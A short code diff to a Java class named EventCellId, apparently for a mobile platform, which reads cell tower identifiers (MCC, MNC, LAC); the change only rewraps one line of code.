@@ -78,7 +78,8 @@ public final class EventCellId extends Event {
 
             final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();
 
-            mcc = Utils.hex(RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex()));
+            mcc = Utils
+                    .hex(RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex()));
             mnc = RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex());
 
             lac = cellinfo.getLAC();
